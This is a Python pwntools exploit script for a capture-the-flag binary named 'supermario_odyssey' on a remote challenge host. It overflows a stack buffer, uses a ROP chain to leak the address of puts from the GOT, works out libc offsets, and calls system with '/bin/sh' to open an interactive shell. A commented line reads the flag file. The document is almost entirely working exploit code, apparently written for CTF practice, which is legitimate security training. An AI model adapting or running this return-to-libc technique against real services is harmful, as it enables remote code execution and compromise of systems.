#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './supermario_odyssey')
lib = CDLL(exe.libc.path)
host = args.HOST or 'supermario-odyssey.chall.srdnlen.it'
port = int(args.PORT or 443)

def unpack(txt):
    return u64(txt.ljust(8, b'\x00'))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4011cc
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()

# print(type(exe.got))
rdi = p64(0x4011e7)
printf = p64(0x401094)
get = p64(0x4010a4)
dati = p64(0x404000)
adjust = p64(0x4011ef)
padding = b"A" * 40
gotGets = 0x403fe8
puts = 0x401074
main = p64(0x401196)

binsh = 0x1cb42f
putslibc = 0x87be0
system = 0x58750

# io = start()
io = start()
payload = flat(
        padding,
        rdi, p64(exe.got["puts"]), puts, 
        main,
        )
io.sendlineafter(b"> ", payload)
io.recvline()
io.recvline()
leak = io.recvline().strip()

print("puts", hex(u64(leak.ljust(8, b"\x00"))), leak) # puts

print(hex(u64(leak.ljust(8, b"\x00")) - putslibc))

systemAddr = (u64(leak.ljust(8, b"\x00")) - putslibc) + system
binshAddr = (u64(leak.ljust(8, b"\x00")) - putslibc) + binsh

print(p64(binshAddr), hex(systemAddr))

payload = flat(
    padding, adjust,
    rdi, p64(binshAddr), p64(systemAddr)
)

io.sendlineafter(b"> ", payload)
io.interactive()

# io.sendline(b"cat flag.txt")
# print(io.recvline())

io.close()


# stdout 0x7f52af8105c0
# stdin 0x7f52af80f8e0
# stderr 0x7f52af8104e0
# puts 0x7f52af693be0
# setbuf 0x7f52af69b750
# printf 0x0
# gets 0x7f52af693080

